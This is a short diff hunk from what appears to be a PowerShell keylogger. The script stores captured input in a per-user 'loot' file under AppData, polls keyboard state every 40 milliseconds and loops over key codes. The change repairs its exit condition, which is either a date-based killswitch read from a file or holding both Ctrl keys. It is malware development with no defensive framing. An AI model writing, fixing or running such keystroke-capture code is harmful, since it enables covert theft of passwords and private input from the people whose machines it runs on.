@@ -27,7 +27,7 @@ function XXXlog($Path="$env:appdata\-locker\$env:UserName-loot.txt"){
       Start-Sleep -Milliseconds 40
       $Lctrl = [Windows.Input.Keyboard]::IsKeyDown([System.Windows.Input.Key]::'LeftCtrl')
       $Rctrl = [Windows.Input.Keyboard]::IsKeyDown([System.Windows.Input.Key]::'RightCtrl')
-      if((get-date) -gt (Get-content "$env:appdata\-locker\killswitch.txt" -or $Rctrl -and $Lctrl)){exit}
+      if((Get-Content "$env:appdata\-locker\killswitch.txt") -ne $null -and ((get-date) -gt (Get-content "$env:appdata\-locker\killswitch.txt")) -or ($Rctrl -and $Lctrl)){exit}
       
 
       for ($ascii = 9; $ascii -le 254; $ascii++) {
